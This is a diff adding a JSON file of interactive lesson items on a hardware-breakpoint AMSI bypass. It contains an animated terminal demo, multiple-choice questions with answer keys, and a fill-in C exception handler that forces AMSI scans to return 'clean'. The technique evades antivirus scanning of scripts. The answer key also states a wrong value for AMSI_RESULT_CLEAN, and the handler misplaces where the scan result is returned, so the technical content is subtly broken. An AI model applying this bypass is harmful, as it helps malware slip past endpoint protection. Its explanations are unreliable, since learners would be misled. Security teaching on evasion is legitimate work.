@@ -1,0 +1,52 @@
+[
+  {
+    "type": "terminal",
+    "title": "HWBP AMSI bypass — zero memory writes",
+    "frames": [
+      {"delay": 0,    "text": "C:\\lab> powershell -c 'Invoke-Expression(\"AMSI test\")'", "cls": "dim"},
+      {"delay": 700,  "text": "[!] AMSI flagged: AMSI_RESULT_DETECTED", "cls": "err"},
+      {"delay": 1000, "text": "C:\\lab> hwbp_bypass.exe --target AmsiScanBuffer", "cls": "dim"},
+      {"delay": 800,  "text": "[*] Resolving AmsiScanBuffer address...", "cls": ""},
+      {"delay": 600,  "text": "[*] Setting DR0 = 0x7FFB2A14C380", "cls": ""},
+      {"delay": 500,  "text": "[*] Adding VEH handler (EXCEPTION_SINGLE_STEP)...", "cls": ""},
+      {"delay": 600,  "text": "[+] HWBP registered. 0 bytes written to amsi.dll", "cls": "ok"},
+      {"delay": 800,  "text": "C:\\lab> powershell -c 'Invoke-Expression(\"AMSI test\")'", "cls": "dim"},
+      {"delay": 700,  "text": "[+] AMSI_RESULT_CLEAN. Tamper Protection: ACTIVE.", "cls": "ok"},
+      {"delay": 400,  "text": "// memory integrity check: nothing to find", "cls": "ok"}
+    ]
+  },
+  {
+    "type": "mcq",
+    "question": "HWBP (Hardware Breakpoint) AMSI bypass avoids EDR memory integrity scanning because:",
+    "choices": [
+      "It patches amsi.dll with NOPs then immediately restores the original bytes",
+      "It uses a kernel driver to disable AMSI at the system level",
+      "Hardware debug registers (DR0–DR3) redirect execution without writing any bytes to the target process",
+      "It hooks NtWriteVirtualMemory to intercept the AMSI scan call"
+    ],
+    "answer": 2,
+    "explanation": "DR0–DR3 are CPU hardware registers set via SetThreadContext(). When execution hits the breakpoint address, a EXCEPTION_SINGLE_STEP fires. The VEH handler changes RAX to AMSI_RESULT_CLEAN and resumes — not one byte of amsi.dll or the process was modified."
+  },
+  {
+    "type": "mcq",
+    "question": "VULN-195458 (22DIV MSRC submission) demonstrated HWBP bypasses Tamper Protection. MSRC rejected it because:",
+    "choices": [
+      "The technique required a kernel driver so it was out of scope",
+      "Detection bypasses that don't modify protected process memory are outside Windows security boundary policy",
+      "Microsoft already patched it in KB5034441",
+      "The submission lacked a working proof of concept"
+    ],
+    "answer": 1,
+    "explanation": "MSRC response: 24 hours, rejection on grounds that bypassing telemetry/detection is not a security boundary violation under their policy. Embargo voided — technique is public. Durable: will not be patched via MSRC."
+  },
+  {
+    "type": "fillin",
+    "prompt": "Complete the VEH handler that forces AMSI to return clean:",
+    "code": "LONG NTAPI VEH_Handler(PEXCEPTION_POINTERS ex) {\n    if (ex->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {\n        ex->ContextRecord->Rax = [BLANK];\n        ex->ContextRecord->Rip = (DWORD64)trampoline;\n        return EXCEPTION_CONTINUE_EXECUTION;\n    }\n    return EXCEPTION_CONTINUE_SEARCH;\n}",
+    "answer": "AMSI_RESULT_CLEAN",
+    "answers": ["AMSI_RESULT_CLEAN", "1", "0"],
+    "hint": "The AMSI result value that means 'no threat found'",
+    "explanation": "AMSI_RESULT_CLEAN (value 1) tells the caller the scan passed. We set RAX (the return value register on x64) before resuming so AmsiScanBuffer 'returns' clean without ever running.",
+    "wrong_hint": "Look up AMSI_RESULT enum — it's the value that indicates a clean scan."
+  }
+]
